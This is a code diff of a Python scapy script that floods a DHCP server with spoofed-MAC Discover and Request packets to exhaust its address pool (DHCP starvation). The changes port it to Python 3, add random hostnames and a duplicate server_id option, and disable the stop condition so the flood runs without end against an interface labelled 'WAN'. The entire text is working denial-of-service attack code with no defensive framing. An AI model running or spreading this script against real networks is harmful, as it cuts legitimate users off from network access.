@@ -7,8 +7,7 @@ from scapy.all import *
 import threading, time, datetime, socket, binascii
 
 def randomMAC():
-    # from DHCPPig
-    mac = [ 0xDE, 0xAD,
+    mac = [ 0xDE, 0xAD, 
         random.randint(0x00, 0x29),
         random.randint(0x00, 0x7f),
         random.randint(0x00, 0xff),
@@ -16,10 +15,8 @@ def randomMAC():
     return ':'.join(map(lambda x: "%02x" % x, mac))
 
 def unpackMAC(binmac):
-    # from DHCPPig
-    mac = binascii.hexlify(binmac)[0:12]
-    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
-    return ':'.join(blocks)
+    mac = binascii.hexlify(binmac, ':')[0:17]
+    return mac
 
 def seconds_diff(dt2, dt1):
     # from https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-36.php
@@ -67,7 +64,7 @@ class DHCPSniffer(threading.Thread):
         if (DHCP in packet):
             if (packet[DHCP] and packet[DHCP].options[0][1] == 2): # if DHCP Offer
                 ip = packet[BOOTP].yiaddr
-                serverip = packet[BOOTP].siaddr
+                serverip = packet[DHCP].options[1][1] # packet[BOOTP].siaddr always 0.0.0.0, i don't know why
                 tranid = packet[BOOTP].xid
                 srcmac = unpackMAC(packet[BOOTP].chaddr)
 
@@ -78,7 +75,7 @@ class DHCPSniffer(threading.Thread):
 
             if (packet[DHCP] and packet[DHCP].options[0][1] == 5): # if DHCP ACK
                 ip = packet[BOOTP].yiaddr
-                print "Got IP address: " + ip
+                print ("Got IP address: " + ip)
 
 
 class DHCPRequestClient():
@@ -91,6 +88,7 @@ class DHCPRequestClient():
         self.ip     = ip
         self.serverip = serverip
         self.tranid = tranid
+        self.hostname = randomHostname(random.randint(6, 10))
 
     def run(self):
         global last_response_time
@@ -108,10 +106,12 @@ class DHCPRequestClient():
                             chaddr = mac2str(self.srcmac))
 
         myoptions   = [ ('message-type', 'request'),
-                        ('param_req_list', chr(1), chr(3), chr(6), chr(15), chr(31), chr(33), chr(43), chr(44), chr(46), chr(47), chr(119), chr(121), chr(249), chr(252)),
+                        ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
                         ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                         ('server_id', self.serverip),
                         ('requested_addr', self.ip),
+                        ('server_id', self.serverip),
+                        ('hostname', self.hostname),
                         ('end')]
         dhcprequest= DHCP(options = myoptions)
 
@@ -143,7 +143,7 @@ class DHCPDiscoverClient():
                             chaddr = mac2str(self.srcmac))
 
         myoptions   = [ ('message-type', 'discover'),
-                        ('param_req_list', chr(1), chr(3), chr(6), chr(15), chr(31), chr(33), chr(43), chr(44), chr(46), chr(47), chr(119), chr(121), chr(249), chr(252)),
+                        ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
                         ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                         ('hostname', self.hostname),
                         ('end') ]
@@ -155,6 +155,7 @@ class DHCPDiscoverClient():
 
 
 def floodDHCPServer(iface):
+    sniffer = None
     try:
         # Send DHCPDiscover continually
         # Sniffer receives OFFER packets, and create a DHCPRequest to receive ACK
@@ -167,15 +168,15 @@ def floodDHCPServer(iface):
             discover.run()
             del discover
 
-            time.sleep(0.05)
+            time.sleep(1)
 
             current_time = datetime.datetime.now()
             # if we hadn't received any offer in 10 seconds, it means DHCP server had been exhausted
-            if (seconds_diff(current_time, last_response_time) > 10):
-                # stop sniffer
-                sniffer.join(2)
-                del sniffer
-                break
+            #if (seconds_diff(current_time, last_response_time) > 10):
+            #    # stop sniffer
+            #    sniffer.join(2)
+            #    del sniffer
+            #    break
     except KeyboardInterrupt:
         sniffer.join(2)
         del sniffer
@@ -186,7 +187,7 @@ last_response_time = datetime.datetime.now()
 
 
 
-floodDHCPServer('eth0')
-print "Done"
+floodDHCPServer('WAN')
+print ("Done")
 
 exit()
